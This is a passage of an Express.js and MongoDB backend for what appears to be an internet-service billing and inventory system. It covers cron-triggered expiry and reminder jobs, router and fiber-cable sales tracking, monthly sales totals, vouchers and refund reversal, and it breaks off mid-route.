// ============ ADMIN TRIGGERS (FOR EXTERNAL CRON SERVICE) ============
// Endpoint for expiry processing - called by cron-job.org at 12 PM daily
// Supports both GET (for cron-job.org) and POST (for manual triggers)
const handleExpiryProcessing = async (req, res) => {
  try {
    console.log('⚙️ Expiry Processing: Running now...');
    await moveTodayExpiredToUnpaid();
    await checkTomorrowExpiringUsers();
    res.status(200).json({
      success: true,
      message: 'Expiry processing executed successfully',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('❌ Expiry processing failed:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to run expiry processing',
      error: error.message
    });
  }
};

app.get('/api/admin/run-expiry-processing', ensureDbConnection, handleExpiryProcessing);
app.post('/api/admin/run-expiry-processing', ensureDbConnection, handleExpiryProcessing);

// Endpoint for reminder processing - called by cron-job.org at 8 PM daily
// Supports both GET (for cron-job.org) and POST (for manual triggers)
const handleReminderProcessing = async (req, res) => {
  try {
    console.log('⚙️ Reminder Processing: Running now...');
    await checkAndSendReminders();
    res.status(200).json({
      success: true,
      message: 'Reminder processing executed successfully',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('❌ Reminder processing failed:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to run reminder processing',
      error: error.message
    });
  }
};

app.get('/api/admin/run-reminders', ensureDbConnection, handleReminderProcessing);
app.post('/api/admin/run-reminders', ensureDbConnection, handleReminderProcessing);

// ============ PAYMENT REMINDER ENDPOINTS ============

// Create a payment reminder
app.post('/api/reminders', ensureDbConnection, async (req, res) => {
  try {
    const { userId, userName, amount, reminderDate, note } = req.body;

    if (!userId || !userName || !reminderDate) {
      return res.status(400).json({
        success: false,
        message: 'userId, userName, and reminderDate are required'
      });
    }

    // Create reminder object
    const reminder = {
      userId,
      userName,
      amount: amount || 0,
      reminderDate: new Date(reminderDate),
      note: note || '',
      notificationTime: '20:00', // 8 PM
      sent: false,
      createdAt: new Date()
    };

    const result = await remindersCollection.insertOne(reminder);

    console.log('✅ Reminder created:', { userId, userName, reminderDate });

    res.status(201).json({
      success: true,
      message: 'Reminder created successfully',
      data: { ...reminder, _id: result.insertedId }
    });
  } catch (error) {
    console.error('❌ Error creating reminder:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to create reminder',
      error: error.message
    });
  }
});

// Get all active reminders (not sent yet)
app.get('/api/reminders', ensureDbConnection, async (req, res) => {
  try {
    const reminders = await remindersCollection
      .find({ sent: false })
      .sort({ reminderDate: 1 })
      .toArray();

    res.status(200).json({
      success: true,
      data: reminders
    });
  } catch (error) {
    console.error('❌ Error fetching reminders:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch reminders',
      error: error.message
    });
  }
});

// Get reminders for a specific user
app.get('/api/reminders/user/:userId', ensureDbConnection, async (req, res) => {
  try {
    const { userId } = req.params;

    const reminders = await remindersCollection
      .find({ userId, sent: false })
      .sort({ reminderDate: 1 })
      .toArray();

    res.status(200).json({
      success: true,
      data: reminders
    });
  } catch (error) {
    console.error('❌ Error fetching user reminders:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch user reminders',
      error: error.message
    });
  }
});

// Delete a reminder
app.delete('/api/reminders/:id', ensureDbConnection, async (req, res) => {
  try {
    const { id } = req.params;

    const result = await remindersCollection.deleteOne({
      _id: new ObjectId(id)
    });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Reminder not found'
      });
    }

    console.log('✅ Reminder deleted:', id);

    res.status(200).json({
      success: true,
      message: 'Reminder deleted successfully'
    });
  } catch (error) {
    console.error('❌ Error deleting reminder:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to delete reminder',
      error: error.message
    });
  }
});

// Function to check and send reminders at 8 PM
const checkAndSendReminders = async () => {
  try {
    console.log('🔔 Checking for reminders at 8:00 PM...');

    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);

    // Find all reminders for today that haven't been sent
    const reminders = await remindersCollection.find({
      reminderDate: {
        $gte: today,
        $lt: tomorrow
      },
      sent: false
    }).toArray();

    console.log(`📋 Found ${reminders.length} reminder(s) for today`);

    if (reminders.length === 0) {
      return;
    }

    // Process each reminder
    for (const reminder of reminders) {
      console.log(`📬 Sending reminder notification for: ${reminder.userName}`);
      console.log(`   User ID: ${reminder.userId}`);
      console.log(`   Amount: Rs ${reminder.amount}`);
      console.log(`   Note: ${reminder.note || 'No note'}`);

      // Mark reminder as sent
      await remindersCollection.updateOne(
        { _id: reminder._id },
        {
          $set: {
            sent: true,
            sentAt: new Date()
          }
        }
      );

      // Here you can add actual notification logic:
      // - Push notification
      // - Email notification
      // - SMS notification
      // - Desktop notification

      // For now, we're just logging it
      console.log(`✅ Reminder marked as sent for ${reminder.userName}`);
    }

    console.log(`✅ Processed ${reminders.length} reminder(s) successfully`);
  } catch (error) {
    console.error('❌ Error checking reminders:', error);
  }
};

// Function to check and send missed reminders on server startup
const checkMissedReminders = async () => {
  try {
    console.log('🔍 Checking for missed reminders on server startup...');

    const now = new Date();
    const currentHour = now.getHours();

    // Get today's date at midnight
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const tomorrow = new Date(today);
    tomorrow.setDate(tomorrow.getDate() + 1);

    // If current time is past 8 PM, send today's reminders
    if (currentHour >= 20) {
      console.log('⏰ Current time is past 8:00 PM, sending today\'s reminders...');

      const todayReminders = await remindersCollection.find({
        reminderDate: {
          $gte: today,
          $lt: tomorrow
        },
        sent: false
      }).toArray();

      if (todayReminders.length > 0) {
        console.log(`📋 Found ${todayReminders.length} missed reminder(s) for today`);

        for (const reminder of todayReminders) {
          console.log(`📬 Sending missed reminder for: ${reminder.userName}`);
          console.log(`   User ID: ${reminder.userId}`);
          console.log(`   Amount: Rs ${reminder.amount}`);
          console.log(`   Note: ${reminder.note || 'No note'}`);

          await remindersCollection.updateOne(
            { _id: reminder._id },
            {
              $set: {
                sent: true,
                sentAt: now
              }
            }
          );

          console.log(`✅ Missed reminder sent for ${reminder.userName}`);
        }
      } else {
        console.log('✓ No missed reminders for today');
      }
    }

    // Also check for any past reminders that were never sent
    const yesterday = new Date(today);
    yesterday.setDate(yesterday.getDate() - 1);

    const pastReminders = await remindersCollection.find({
      reminderDate: {
        $lt: today
      },
      sent: false
    }).toArray();

    if (pastReminders.length > 0) {
      console.log(`⚠️ Found ${pastReminders.length} old unsent reminder(s) from previous days`);

      for (const reminder of pastReminders) {
        const reminderDate = new Date(reminder.reminderDate);
        console.log(`📬 Sending overdue reminder for: ${reminder.userName}`);
        console.log(`   Original date: ${reminderDate.toLocaleDateString('en-GB')}`);
        console.log(`   User ID: ${reminder.userId}`);
        console.log(`   Amount: Rs ${reminder.amount}`);

        await remindersCollection.updateOne(
          { _id: reminder._id },
          {
            $set: {
              sent: true,
              sentAt: now
            }
          }
        );

        console.log(`✅ Overdue reminder sent for ${reminder.userName}`);
      }
    } else {
      console.log('✓ No overdue reminders found');
    }

    console.log('✅ Missed reminders check completed');
  } catch (error) {
    console.error('❌ Error checking missed reminders:', error);
  }
};

// ============ ROUTERS API ROUTES ============

// GET all routers
app.get('/api/routers', async (req, res) => {
  try {
    const routers = await routersCollection.find().sort({ createdAt: -1 }).toArray();
    res.status(200).json({
      success: true,
      count: routers.length,
      routers: routers
    });
  } catch (error) {
    console.error('Error fetching routers:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching routers',
      error: error.message
    });
  }
});

// POST create a new router
app.post('/api/routers', async (req, res) => {
  try {
    const { brand, model, quantity, price, purchasePrice, supplier, purchaseDate, status } = req.body;

    if (!brand || !model || quantity === undefined || price === undefined) {
      return res.status(400).json({
        success: false,
        message: 'Brand, model, quantity, and price are required'
      });
    }

    const router = {
      brand: brand.trim(),
      model: model.trim(),
      quantity: parseInt(quantity),
      quantitySold: 0,
      price: parseFloat(price),
      purchasePrice: purchasePrice ? parseFloat(purchasePrice) : undefined,
      supplier: supplier ? supplier.trim() : '',
      purchaseDate: purchaseDate || new Date().toISOString().split('T')[0],
      status: status || 'Available',
      salesHistory: [],
      createdAt: new Date()
    };

    const result = await routersCollection.insertOne(router);

    res.status(201).json({
      success: true,
      message: 'Router added successfully',
      data: {
        _id: result.insertedId,
        ...router
      }
    });
  } catch (error) {
    console.error('Error adding router:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding router',
      error: error.message
    });
  }
});

// UPDATE a router
app.put('/api/routers/:id', async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid router ID format'
      });
    }

    const { brand, model, quantity, availableStock, price, purchasePrice, supplier, purchaseDate, status } = req.body;

    const updateData = {};
    if (brand !== undefined) updateData.brand = brand.trim();
    if (model !== undefined) updateData.model = model.trim();
    // If availableStock is provided, use the total quantity from frontend
    // Otherwise use the quantity directly
    if (quantity !== undefined) updateData.quantity = parseInt(quantity);
    if (price !== undefined) updateData.price = parseFloat(price);
    if (purchasePrice !== undefined) updateData.purchasePrice = parseFloat(purchasePrice);
    if (supplier !== undefined) updateData.supplier = supplier.trim();
    if (purchaseDate !== undefined) updateData.purchaseDate = purchaseDate;
    if (status !== undefined) updateData.status = status;

    const result = await routersCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updateData }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Router not found'
      });
    }

    res.json({
      success: true,
      message: 'Router updated successfully'
    });
  } catch (error) {
    console.error('Error updating router:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating router',
      error: error.message
    });
  }
});

// DELETE a router
app.delete('/api/routers/:id', async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid router ID format'
      });
    }

    const result = await routersCollection.deleteOne({ _id: new ObjectId(req.params.id) });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Router not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Router deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting router:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting router',
      error: error.message
    });
  }
});

// POST sell router
app.post('/api/routers/:id/sell', async (req, res) => {
  try {
    const { quantity, sellingPrice, customerName, notes } = req.body;

    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid router ID format'
      });
    }

    if (!quantity || quantity <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Valid quantity is required'
      });
    }

    const router = await routersCollection.findOne({ _id: new ObjectId(req.params.id) });

    if (!router) {
      return res.status(404).json({
        success: false,
        message: 'Router not found'
      });
    }

    const availableQty = router.quantity - (router.quantitySold || 0);
    if (quantity > availableQty) {
      return res.status(400).json({
        success: false,
        message: `Only ${availableQty} units available to sell`
      });
    }

    const saleRecord = {
      quantity: parseInt(quantity),
      sellingPrice: sellingPrice ? parseFloat(sellingPrice) : router.price,
      customerName: customerName || '',
      notes: notes || '',
      saleDate: new Date().toISOString()
    };

    const result = await routersCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      {
        $inc: { quantitySold: parseInt(quantity) },
        $push: { salesHistory: saleRecord }
      }
    );

    // Update monthly sales
    const now = new Date();
    const pktDate = new Date(now.getTime() + (PKT_OFFSET_MIN * 60000));
    const currentMonth = pktDate.getMonth() + 1;
    const currentYear = pktDate.getFullYear();
    const monthKey = `${currentYear}-${String(currentMonth).padStart(2, '0')}`;

    const saleAmount = parseInt(quantity) * parseFloat(saleRecord.sellingPrice);

    await monthlySalesCollection.updateOne(
      { monthKey: monthKey },
      {
        $inc: {
          totalSales: saleAmount,
          routerSales: saleAmount
        },
        $set: {
          month: currentMonth,
          year: currentYear,
          lastUpdated: new Date().toISOString()
        }
      },
      { upsert: true }
    );

    res.status(200).json({
      success: true,
      message: 'Router sold successfully',
      data: saleRecord
    });
  } catch (error) {
    console.error('Error selling router:', error);
    res.status(500).json({
      success: false,
      message: 'Error selling router',
      error: error.message
    });
  }
});

// GET sold routers
app.get('/api/routers/filter/sold', async (req, res) => {
  try {
    const routers = await routersCollection.find({
      quantitySold: { $gt: 0 }
    }).sort({ createdAt: -1 }).toArray();

    res.status(200).json({
      success: true,
      count: routers.length,
      routers: routers
    });
  } catch (error) {
    console.error('Error fetching sold routers:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching sold routers',
      error: error.message
    });
  }
});

// GET router sales report by date range
app.get('/api/routers/sales-report', async (req, res) => {
  try {
    const { fromDate, toDate } = req.query;

    if (!fromDate || !toDate) {
      return res.status(400).json({
        success: false,
        message: 'From date and to date are required'
      });
    }

    const from = new Date(fromDate);
    from.setHours(0, 0, 0, 0);
    const to = new Date(toDate);
    to.setHours(23, 59, 59, 999);

    // Get all routers with sales history
    const routers = await routersCollection.find({
      'salesHistory.0': { $exists: true }
    }).toArray();

    let sales = [];
    let totalQuantitySold = 0;
    let totalRevenue = 0;
    let totalProfit = 0;

    routers.forEach(router => {
      if (router.salesHistory && router.salesHistory.length > 0) {
        router.salesHistory.forEach(sale => {
          const saleDate = new Date(sale.saleDate);
          if (saleDate >= from && saleDate <= to) {
            const revenue = sale.quantity * sale.sellingPrice;
            const purchasePrice = router.purchasePrice || 0;
            const profit = (sale.sellingPrice - purchasePrice) * sale.quantity;

            sales.push({
              brand: router.brand,
              model: router.model,
              quantity: sale.quantity,
              sellingPrice: sale.sellingPrice,
              customerName: sale.customerName,
              notes: sale.notes,
              saleDate: sale.saleDate,
              profit: profit
            });

            totalQuantitySold += sale.quantity;
            totalRevenue += revenue;
            totalProfit += profit;
          }
        });
      }
    });

    // Sort sales by date (newest first)
    sales.sort((a, b) => new Date(b.saleDate) - new Date(a.saleDate));

    res.status(200).json({
      success: true,
      data: {
        sales,
        totalSales: sales.length,
        totalQuantitySold,
        totalRevenue,
        totalProfit
      }
    });
  } catch (error) {
    console.error('Error fetching router sales report:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching router sales report',
      error: error.message
    });
  }
});

// ============ FIBER CABLES API ROUTES ============

// GET all fiber cables
app.get('/api/fiber-cables', async (req, res) => {
  try {
    const cables = await fiberCablesCollection.find().sort({ createdAt: -1 }).toArray();
    res.status(200).json({
      success: true,
      count: cables.length,
      cables: cables
    });
  } catch (error) {
    console.error('Error fetching fiber cables:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching fiber cables',
      error: error.message
    });
  }
});

// POST create a new fiber cable
app.post('/api/fiber-cables', async (req, res) => {
  try {
    const { type, length, pricePerMeter, purchasePricePerMeter, purchaseDate, supplier, status } = req.body;

    if (!type || length === undefined || pricePerMeter === undefined) {
      return res.status(400).json({
        success: false,
        message: 'Type, length, and price per meter are required'
      });
    }

    const cable = {
      type: type.trim(),
      length: parseFloat(length),
      lengthSold: 0,
      pricePerMeter: parseFloat(pricePerMeter),
      purchasePricePerMeter: purchasePricePerMeter ? parseFloat(purchasePricePerMeter) : undefined,
      purchaseDate: purchaseDate || new Date().toISOString().split('T')[0],
      supplier: supplier ? supplier.trim() : '',
      status: status || 'Available',
      salesHistory: [],
      createdAt: new Date()
    };

    const result = await fiberCablesCollection.insertOne(cable);

    res.status(201).json({
      success: true,
      message: 'Fiber cable added successfully',
      data: {
        _id: result.insertedId,
        ...cable
      }
    });
  } catch (error) {
    console.error('Error adding fiber cable:', error);
    res.status(500).json({
      success: false,
      message: 'Error adding fiber cable',
      error: error.message
    });
  }
});

// UPDATE a fiber cable
app.put('/api/fiber-cables/:id', async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid fiber cable ID format'
      });
    }

    const { type, length, availableStock, pricePerMeter, purchasePricePerMeter, purchaseDate, supplier, status } = req.body;

    const updateData = {};
    if (type !== undefined) updateData.type = type.trim();
    // If availableStock is provided, use the total length from frontend
    // Otherwise use the length directly
    if (length !== undefined) updateData.length = parseFloat(length);
    if (pricePerMeter !== undefined) updateData.pricePerMeter = parseFloat(pricePerMeter);
    if (purchasePricePerMeter !== undefined) updateData.purchasePricePerMeter = parseFloat(purchasePricePerMeter);
    if (purchaseDate !== undefined) updateData.purchaseDate = purchaseDate;
    if (supplier !== undefined) updateData.supplier = supplier.trim();
    if (status !== undefined) updateData.status = status;

    const result = await fiberCablesCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      { $set: updateData }
    );

    if (result.matchedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Fiber cable not found'
      });
    }

    res.json({
      success: true,
      message: 'Fiber cable updated successfully'
    });
  } catch (error) {
    console.error('Error updating fiber cable:', error);
    res.status(500).json({
      success: false,
      message: 'Error updating fiber cable',
      error: error.message
    });
  }
});

// DELETE a fiber cable
app.delete('/api/fiber-cables/:id', async (req, res) => {
  try {
    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid fiber cable ID format'
      });
    }

    const result = await fiberCablesCollection.deleteOne({ _id: new ObjectId(req.params.id) });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: 'Fiber cable not found'
      });
    }

    res.status(200).json({
      success: true,
      message: 'Fiber cable deleted successfully'
    });
  } catch (error) {
    console.error('Error deleting fiber cable:', error);
    res.status(500).json({
      success: false,
      message: 'Error deleting fiber cable',
      error: error.message
    });
  }
});

// POST sell fiber cable
app.post('/api/fiber-cables/:id/sell', async (req, res) => {
  try {
    const { length, sellingPricePerMeter, customerName, notes } = req.body;

    if (!ObjectId.isValid(req.params.id)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid fiber cable ID format'
      });
    }

    if (!length || length <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Valid length is required'
      });
    }

    const cable = await fiberCablesCollection.findOne({ _id: new ObjectId(req.params.id) });

    if (!cable) {
      return res.status(404).json({
        success: false,
        message: 'Fiber cable not found'
      });
    }

    const availableLength = cable.length - (cable.lengthSold || 0);
    if (length > availableLength) {
      return res.status(400).json({
        success: false,
        message: `Only ${availableLength} meters available to sell`
      });
    }

    const saleRecord = {
      length: parseFloat(length),
      sellingPricePerMeter: sellingPricePerMeter ? parseFloat(sellingPricePerMeter) : cable.pricePerMeter,
      customerName: customerName || '',
      notes: notes || '',
      saleDate: new Date().toISOString()
    };

    const result = await fiberCablesCollection.updateOne(
      { _id: new ObjectId(req.params.id) },
      {
        $inc: { lengthSold: parseFloat(length) },
        $push: { salesHistory: saleRecord }
      }
    );

    // Update monthly sales
    const now = new Date();
    const pktDate = new Date(now.getTime() + (PKT_OFFSET_MIN * 60000));
    const currentMonth = pktDate.getMonth() + 1;
    const currentYear = pktDate.getFullYear();
    const monthKey = `${currentYear}-${String(currentMonth).padStart(2, '0')}`;

    const saleAmount = parseFloat(length) * parseFloat(saleRecord.sellingPricePerMeter);

    await monthlySalesCollection.updateOne(
      { monthKey: monthKey },
      {
        $inc: {
          totalSales: saleAmount,
          cableSales: saleAmount
        },
        $set: {
          month: currentMonth,
          year: currentYear,
          lastUpdated: new Date().toISOString()
        }
      },
      { upsert: true }
    );

    res.status(200).json({
      success: true,
      message: 'Fiber cable sold successfully',
      data: saleRecord
    });
  } catch (error) {
    console.error('Error selling fiber cable:', error);
    res.status(500).json({
      success: false,
      message: 'Error selling fiber cable',
      error: error.message
    });
  }
});

// GET sold fiber cables
app.get('/api/fiber-cables/filter/sold', async (req, res) => {
  try {
    const cables = await fiberCablesCollection.find({
      lengthSold: { $gt: 0 }
    }).sort({ createdAt: -1 }).toArray();

    res.status(200).json({
      success: true,
      count: cables.length,
      cables: cables
    });
  } catch (error) {
    console.error('Error fetching sold fiber cables:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching sold fiber cables',
      error: error.message
    });
  }
});

// GET fiber cable sales report by date range
app.get('/api/fiber-cables/sales-report', async (req, res) => {
  try {
    const { fromDate, toDate } = req.query;

    if (!fromDate || !toDate) {
      return res.status(400).json({
        success: false,
        message: 'From date and to date are required'
      });
    }

    const from = new Date(fromDate);
    from.setHours(0, 0, 0, 0);
    const to = new Date(toDate);
    to.setHours(23, 59, 59, 999);

    // Get all fiber cables with sales history
    const cables = await fiberCablesCollection.find({
      'salesHistory.0': { $exists: true }
    }).toArray();

    let sales = [];
    let totalLengthSold = 0;
    let totalRevenue = 0;
    let totalProfit = 0;

    cables.forEach(cable => {
      if (cable.salesHistory && cable.salesHistory.length > 0) {
        cable.salesHistory.forEach(sale => {
          const saleDate = new Date(sale.saleDate);
          if (saleDate >= from && saleDate <= to) {
            const revenue = sale.length * sale.sellingPrice;
            const purchasePricePerMeter = cable.purchasePricePerMeter || 0;
            const profit = (sale.sellingPrice - purchasePricePerMeter) * sale.length;

            sales.push({
              type: cable.type,
              length: sale.length,
              sellingPrice: sale.sellingPrice,
              customerName: sale.customerName,
              notes: sale.notes,
              saleDate: sale.saleDate,
              profit: profit
            });

            totalLengthSold += sale.length;
            totalRevenue += revenue;
            totalProfit += profit;
          }
        });
      }
    });

    // Sort sales by date (newest first)
    sales.sort((a, b) => new Date(b.saleDate) - new Date(a.saleDate));

    res.status(200).json({
      success: true,
      data: {
        sales,
        totalSales: sales.length,
        totalLengthSold,
        totalRevenue,
        totalProfit
      }
    });
  } catch (error) {
    console.error('Error fetching fiber cable sales report:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching fiber cable sales report',
      error: error.message
    });
  }
});

// ============ TOTAL SALES API ROUTE ============

// GET total sales from routers and fiber cables
// Get current month's total sales
app.get('/api/sales/total', async (req, res) => {
  try {
    // Get current month and year in PKT
    const now = new Date();
    const pktDate = new Date(now.getTime() + (PKT_OFFSET_MIN * 60000));
    const currentMonth = pktDate.getMonth() + 1; // 1-12
    const currentYear = pktDate.getFullYear();
    const monthKey = `${currentYear}-${String(currentMonth).padStart(2, '0')}`; // e.g., "2024-12"

    // Get monthly sales record
    const monthlySales = await monthlySalesCollection.findOne({
      monthKey: monthKey
    });

    const totalSales = monthlySales ? monthlySales.totalSales : 0;
    const routerSales = monthlySales ? monthlySales.routerSales : 0;
    const cableSales = monthlySales ? monthlySales.cableSales : 0;

    res.status(200).json({
      success: true,
      data: {
        totalSales,
        routerSales,
        cableSales,
        breakdown: {
          routers: routerSales,
          fiberCables: cableSales
        },
        month: monthKey
      }
    });
  } catch (error) {
    console.error('Error fetching total sales:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching total sales',
      error: error.message
    });
  }
});

// Get sales history by month
app.get('/api/sales/history', async (req, res) => {
  try {
    const history = await monthlySalesCollection.find({})
      .sort({ year: -1, month: -1 })
      .limit(12)
      .toArray();

    res.status(200).json({
      success: true,
      data: history
    });
  } catch (error) {
    console.error('Error fetching sales history:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching sales history',
      error: error.message
    });
  }
});

// ============ VOUCHERS ROUTES ============
// Get all vouchers (or filter by userId if query parameter provided)
app.get('/api/vouchers', ensureDbConnection, async (req, res) => {
  try {
    const { userId, userIds } = req.query;

    let query = {};
    if (userId) {
      query = { userId };
    } else if (userIds) {
      // Support comma-separated string or array
      const idList = Array.isArray(userIds) ? userIds : userIds.split(',');
      query = { userId: { $in: idList } };
      console.log(`📦 Bulk fetching vouchers for ${idList.length} users`);
    }

    const vouchers = await vouchersCollection.find(query).toArray();

    res.status(200).json({
      success: true,
      data: vouchers
    });
  } catch (error) {
    console.error('Error fetching vouchers:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching vouchers',
      error: error.message
    });
  }
});

// Get vouchers by user ID
app.get('/api/vouchers/user/:userId', ensureDbConnection, async (req, res) => {
  try {
    const { userId } = req.params;
    const vouchers = await vouchersCollection.find({ userId }).toArray();

    // Debug: Log receivedBy for first voucher's first month
    if (vouchers.length > 0 && vouchers[0].months && vouchers[0].months.length > 0) {
      const firstMonth = vouchers[0].months[0];
      console.log(`🔍 Voucher API - First month receivedBy:`, {
        month: firstMonth.month,
        receivedBy: firstMonth.receivedBy,
        hasPaymentHistory: !!firstMonth.paymentHistory,
        paymentHistoryReceivedBy: firstMonth.paymentHistory?.map((p) => p.receivedBy).filter(Boolean) || []
      });
    }

    res.status(200).json({
      success: true,
      data: vouchers
    });
  } catch (error) {
    console.error('Error fetching user vouchers:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching user vouchers',
      error: error.message
    });
  }
});


// POST create refund
app.post('/api/refunds', ensureDbConnection, async (req, res) => {
  try {
    const refundsCollection = db.collection('refunds');
    const refundData = req.body;

    const result = await refundsCollection.insertOne({
      ...refundData,
      createdAt: new Date()
    });

    console.log(`✅ REFUND SAVED: ${refundData.userName} - ${refundData.refundedMonths?.length || 0} months`);

    res.status(201).json({
      success: true,
      data: { _id: result.insertedId, ...refundData }
    });
  } catch (error) {
    console.error('Error creating refund:', error);
    res.status(500).json({
      success: false,
      message: 'Error creating refund',
      error: error.message
    });
  }
});

// GET refunds for a user
app.get('/api/refunds/:userId', ensureDbConnection, async (req, res) => {
  try {
    const userId = req.params.userId;
    const refundsCollection = db.collection('refunds');

    // Find all refunds for this user
    const refunds = await refundsCollection.find({ userId }).toArray();

    console.log(`📋 Found ${refunds.length} refund records for user ${userId}`);

    res.status(200).json({
      success: true,
      data: refunds
    });
  } catch (error) {
    console.error('Error fetching refunds:', error);
    res.status(500).json({
      success: false,
      message: 'Error fetching refunds',
      error: error.message
    });
  }
});

// POST process reversed payment - convert refund back to paid
app.post('/api/refunds/process-payment', ensureDbConnection, async (req, res) => {
  try {
    const { userId, notes } = req.body;

    if (!userId) {
      return res.status(400).json({
        success: false,
        message: 'userId is required'
      });
    }

    console.log(`💰 Processing reversed payment for user: ${userId}`);
    console.log(`📝 Notes: ${notes || 'No notes'}`);

    const refundsCollection = db.collection('refunds');

    // Find all refunds for this user
    const refunds = await refundsCollection.find({ userId }).toArray();

    if (refunds.length === 0) {
      return res.status(404).json({
        success: false,
        message: 'No refund records found for this user'
      });
    }

    console.log(`📋 Found ${refunds.length} refund record(s)`);

    let processedMonths = 0;
    let totalAmount = 0;

    // Process each refund
    for (const refund of refunds) {
      const voucherId = refund.voucherId;
      console.log(`🔍 Processing refund with voucherId: ${voucherId}`);

      // Find the voucher by _id
      const voucher = await vouchersCollection.findOne({ _id: new ObjectId(voucherId) });

      if (!voucher) {
        console.log(`⚠️ Voucher not found: ${voucherId}`);
        continue;
      }

      console.log(`✅ Found voucher for user: ${voucher.userName}`);

      // Process each refunded month
      if (refund.refundedMonths && Array.isArray(refund.refundedMonths)) {
        for (const refundedMonth of refund.refundedMonths) {
          console.log(`📅 Processing month: ${refundedMonth.month}`);

          // Find matching month in voucher
          const monthIndex = voucher.months.findIndex(m => m.month === refundedMonth.month);

          if (monthIndex !== -1) {
            // Update month status to 'paid'
            await vouchersCollection.updateOne(
              {
                _id: new ObjectId(voucherId),
                'months.month': refundedMonth.month
              },
              {
                $set: {
                  'months.$.status': 'paid',
                  'months.$.paidAmount': refundedMonth.packageFee - (refundedMonth.discount || 0),
                  'months.$.remainingAmount': 0,
                  'months.$.paymentMethod': 'Cash',
                  'months.$.receivedBy': 'Admin',
                  'months.$.description': `${refundedMonth.month} - Reversed payment processed${notes ? ': ' + notes : ''}`
                },
                $unset: {
                  'months.$.refundDate': '',
                  'months.$.refundedAmount': ''
                }
              }
            );

            processedMonths++;
            totalAmount += (refundedMonth.packageFee - (refundedMonth.discount || 0));
            console.log(`✅ Updated ${refundedMonth.month} to paid status`);
          } else {
            console.log(`⚠️ Month not found in voucher: ${refundedMonth.month}`);
          }
        }
      }

      // Remove the refund record
      await refundsCollection.deleteOne({ _id: refund._id });
      console.log(`🗑️ Removed refund record`);
    }

    // Update user status and amounts
    const user = await usersCollection.findOne({ _id: new ObjectId(userId) });
    if (user) {
      // Recalculate amounts from vouchers (excluding reversed months)
      const userVouchers = await vouchersCollection.find({ userId }).toArray();
      let totalPaid = 0;
      let totalRemaining = 0;
      let hasUnpaidMonths = false;

      for (const v of userVouchers) {
        if (v.months && Array.isArray(v.months)) {
          // Only count non-reversed months
          const nonReversedMonths = v.months.filter(m => {
            const isReversed = !!(m.refundDate || m.refundedAmount);
            return !isReversed;
          });

          nonReversedMonths.forEach(m => {
            totalPaid += Number(m.paidAmount || 0);
            totalRemaining += Number(m.remainingAmount || 0);
          });

          // Check if there are any remaining unpaid months
          if (nonReversedMonths.some(m => m.status === 'unpaid' || (m.remainingAmount && m.remainingAmount > 0))) {
            hasUnpaidMonths = true;
          }
        }
      }

      // Determine new status
      let newStatus = 'unpaid';
      if (totalRemaining === 0 && totalPaid > 0) {
        newStatus = 'paid';
      } else if (totalPaid > 0) {
        newStatus = 'partial';
      }

      // Update user with new amounts and status
      await usersCollection.updateOne(
        { _id: new ObjectId(userId) },
        {
          $set: {
            status: newStatus,
            paidAmount: totalPaid,
            remainingAmount: totalRemaining
          }
        }
      );
      console.log(`✅ Updated user status to '${newStatus}', paidAmount: ${totalPaid}, remainingAmount: ${totalRemaining}`);
    }

    res.status(200).json({
      success: true,
      message: `Successfully processed ${processedMonths} reversed payment(s)`,
      data: {
        processedMonths,
        totalAmount,
        notes
      }
    });
  } catch (error) {
    console.error('❌ Error processing reversed payment:', error);
    res.status(500).json({
      success: false,
      message: 'Error processing reversed payment',
      error: error.message
    });
  }
});

// POST convert paid/partial month to unpaid (clear payment history)
app.post('/api/vouchers/convert-to-unpaid', ensureDbConnection, async (req, res) => {
  try {
    const { userId, month, newPackageFee, newDiscount } = req.body;

    if (!userId || !month) {
      return res.status(400).json({
        success: false,
        message: 'userId and month are required'
      });
    }

    console.log(`🔄 Converting month ${month} to unpaid for user ${userId}`);

    // Find voucher for this user
    const voucher = await vouchersCollection.findOne({ userId });

    if (!voucher) {
      return res.status(404).json({
        success: false,
